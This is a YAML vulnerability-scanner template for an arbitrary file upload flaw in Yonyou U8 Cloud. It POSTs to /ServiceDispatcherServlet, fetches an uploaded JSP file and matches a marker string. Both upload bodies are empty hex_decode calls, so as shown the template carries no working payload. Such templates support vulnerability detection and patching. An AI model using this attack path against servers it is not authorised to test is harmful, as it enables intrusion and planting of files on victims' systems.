id: youyouU8-Cloud-IPFxxFileService-upload

info:
  name: 用友U8Cloud IPFxxFileService 任意文件上传漏洞
  author: youyouU8
  severity: high
  tags: youyouU8

http:
  - raw:
      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Host: {{Hostname}}
        Connection: close
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0

        {{hex_decode("")}}

      - |
        POST /ServiceDispatcherServlet HTTP/1.1
        Content-Type: application/x-www-form-urlencoded
        Host: {{Hostname}}
        Connection: close
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0

        {{hex_decode("")}}

      - |+
        GET /ted9est.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Encoding: gzip, deflate

    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body_3
        words:
          - '1d2s5et9uds35s'
    matchers-condition: and
